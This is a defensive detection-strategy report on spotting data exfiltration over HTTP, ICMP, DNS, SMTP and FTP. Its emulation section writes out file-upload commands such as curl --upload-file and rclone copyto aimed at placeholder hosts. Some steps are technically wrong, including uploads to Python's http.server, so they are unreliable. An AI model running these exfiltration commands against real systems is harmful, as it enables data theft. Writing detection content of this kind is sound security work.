# Alerting & Detection Strategy (ADS) Report: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

## Goal
This strategy aims to detect adversarial attempts to bypass security monitoring by using alternative protocols for data exfiltration. Specifically, it focuses on techniques that involve the transmission of sensitive data via non-standard or obfuscated channels that are not typically monitored as command and control (C2) protocols.

## Categorization

- **MITRE ATT&CK Mapping:** T1048.003 - Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- **Tactic / Kill Chain Phases:** Exfiltration
- **Platforms:** Linux, macOS, Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1048/003)

## Strategy Abstract
The detection strategy leverages network and host data sources to identify anomalous patterns indicative of exfiltration. Key data sources include:
- Network traffic logs (e.g., firewall, IDS/IPS)
- Host process monitoring (e.g., Sysmon on Windows, Auditd on Linux)
- Application logs

Patterns analyzed involve unusual network connections or data transfers over non-standard ports and protocols such as HTTP, ICMP, DNS, SMTP, FTP, etc. The strategy also examines uncharacteristic behavior in application usage that may suggest obfuscation or tunneling.

## Technical Context
Adversaries often execute exfiltration via alternative protocols to evade detection by traditional security controls. They may use:
- Obfuscated communication channels (e.g., DNS queries with encoded data)
- Non-standard ports for common protocols (e.g., HTTP on non-port 80/443)

### Adversary Emulation Details
- **HTTP Exfiltration:** Using `curl` to upload files via a custom server setup.
- **ICMP Echo Requests:** Embedding small amounts of data in ICMP payloads.
- **DNS Tunneling:** Encoding data within DNS query strings.

## Blind Spots and Assumptions
- Assumes baseline knowledge of normal network behavior, which may not account for all legitimate uses of alternative protocols.
- Detection is less effective against highly sophisticated adversaries using custom encryption or encoding techniques.
- Relies on the availability and integrity of logs from various sources.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of non-standard ports for internal applications (e.g., development environments).
- Use of DNS for dynamic service discovery in microservices architectures.
- Normal SMTP traffic for email forwarding services.

## Priority
**Severity: High**
Justification: Exfiltration represents a significant risk as it directly leads to data loss. The ability to bypass traditional monitoring mechanisms makes this technique particularly dangerous and worthy of high priority.

## Validation (Adversary Emulation)
### Exfiltration Over Alternative Protocol - HTTP
1. Set up a simple HTTP server on an internal host using `python3 -m http.server`.
2. Use `curl` from another machine to upload files to the server: `curl --upload-file <file> http://<target-host>:<port>`.

### Exfiltration Over Alternative Protocol - ICMP
1. Use `hping3` to send custom ICMP packets with data payloads.
2. On the target, capture and decode these packets using a script or tool capable of interpreting embedded data.

### Exfiltration Over Alternative Protocol - DNS
1. Set up a DNS server that logs all queries.
2. Use a script on an attacker machine to encode data into DNS query strings and send them to the server.
3. Decode the responses from the DNS server to retrieve exfiltrated data.

### Exfiltration Over Alternative Protocol - SMTP
1. Configure a simple mail server (e.g., Postfix) to accept connections.
2. Use `swaks` or similar tools to send emails with attachments from an attacker machine.

### MAZE FTP Upload
1. Set up an FTP server on a target host.
2. Use `ftp` command-line tool to upload files: `ftp <target-host>` and follow prompts to transfer data.

### Exfiltration Over Alternative Protocol - FTP - Rclone
1. Install and configure `rclone` with a remote storage provider that accepts FTP.
2. Run `rclone copyto <file> ftp:` to exfiltrate data through the configured FTP server.

### Python3 http.server
- Start an HTTP server on the target host: `python3 -m http.server 8080`.
- Use any web client or tool like `wget` to upload files to this server.

## Response
When alerts fire, analysts should:
1. Verify the legitimacy of network traffic and connections.
2. Investigate involved endpoints for signs of compromise (e.g., unusual processes, file changes).
3. Correlate with other security events for broader context (e.g., lateral movement indicators).
4. Contain affected systems to prevent further data loss.
5. Perform a detailed forensic analysis to understand the scope and method of exfiltration.

## Additional Resources
- None available

This report provides a comprehensive overview of detecting adversarial attempts at exfiltrating data via non-C2 protocols, aligned with Palantir's ADS framework.